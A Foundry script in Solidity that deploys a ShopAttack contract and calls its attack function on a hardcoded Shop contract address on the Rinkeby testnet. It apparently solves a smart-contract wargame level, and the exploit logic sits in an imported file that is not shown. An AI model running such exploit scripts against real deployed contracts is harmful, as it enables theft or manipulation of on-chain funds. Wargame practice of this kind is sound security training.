// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import { Script } from "forge-std/script.sol";
import { Shop } from "src/Shop/Shop.sol";
import { ShopAttack } from "src/Shop/ShopAttack.sol";

contract ShopAttackScript is Script {

    // attack contract: https://rinkeby.etherscan.io/address/0x116dcfe2edab858278922337b46075f6f83e78aa
    function run() public {
        address shopAddress = address(0x360e1C929F17882E09d9857E0D3DC88bb132789B);

        vm.startBroadcast();
        ShopAttack attacker = new ShopAttack();
        attacker.attack(shopAddress);
        vm.stopBroadcast();
    }
}

